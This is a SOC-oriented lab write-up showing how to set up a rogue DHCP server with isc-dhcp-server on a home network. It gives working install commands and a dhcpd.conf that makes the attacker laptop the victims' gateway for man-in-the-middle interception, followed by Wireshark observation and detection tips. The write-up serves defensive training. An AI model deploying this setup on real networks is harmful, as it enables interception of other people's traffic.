
# 05 - Rogue DHCP Attack Practical Lab (SOC Focused)

**Author:** Muhammad Awais Javed (Mian Awais)  
**Date:** April 2026  
**Part of:** SOC-Journey-2026

### Objective
To understand how an attacker can set up a **Rogue DHCP Server** to hijack IP assignments and perform Man-in-the-Middle (MITM) attacks. This is a real-world attack that SOC analysts must know how to detect and prevent.

### What is Rogue DHCP?
Rogue DHCP is an attack where an unauthorized DHCP server is placed on the network. It responds faster than the legitimate DHCP server and gives victims a malicious IP configuration (wrong gateway, wrong DNS, etc.).  
This allows the attacker to become the gateway and capture or modify all victim traffic.

### Tools Used
- Kali Linux
- `isc-dhcp-server`
- Wireshark
- Victim device (Android phone)

### Lab Setup
- **Legitimate DHCP Server**: PC Kali VM (192.168.100.91)
- **Rogue DHCP Server (Attacker)**: Linux Laptop (192.168.100.90)
- **Victim**: Android Phone

### Step-by-Step Lab (What Actually Worked)

**1. On Attacker Laptop (Rogue Server)**

```bash
sudo apt update
sudo apt install isc-dhcp-server -y

sudo mkdir -p /var/lib/dhcp
sudo touch /var/lib/dhcp/dhcpd.leases
sudo chown -R root:root /var/lib/dhcp
sudo chmod 644 /var/lib/dhcp/dhcpd.leases
```

**2. Configure Rogue DHCP**

```bash
sudo nano /etc/dhcp/dhcpd.conf
```

**Working Configuration:**

```conf
subnet 192.168.100.0 netmask 255.255.255.0 {
  range 192.168.100.100 192.168.100.200;
  option routers 192.168.100.90;          # Attacker laptop as gateway
  option domain-name-servers 8.8.8.8;
  default-lease-time 600;
  max-lease-time 7200;
}
```

**3. Start Rogue DHCP Server**

```bash
sudo killall dhcpd
sudo dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid eth0 -d
```

**4. On Victim Phone**
- Forget the Wi-Fi network completely
- Turn Wi-Fi **OFF** → Wait 15-20 seconds → Turn **ON**
- Repeat 4-6 times

**Result:** Phone received rogue IP in range `192.168.100.100 - 200`

### Wireshark Analysis
Filter used: `udp.port == 67 or udp.port == 68`

Observed:
- DHCP Discover from phone
- Offers from both legitimate and rogue servers
- Phone accepted rogue server's Offer when network was forgotten

### SOC Takeaway
- Rogue DHCP is a dangerous attack that can lead to full MITM.
- SOC analysts monitor for:
  - Multiple DHCP Offers on the network
  - Unknown leases / sudden gateway changes
  - Devices getting IPs from unexpected ranges



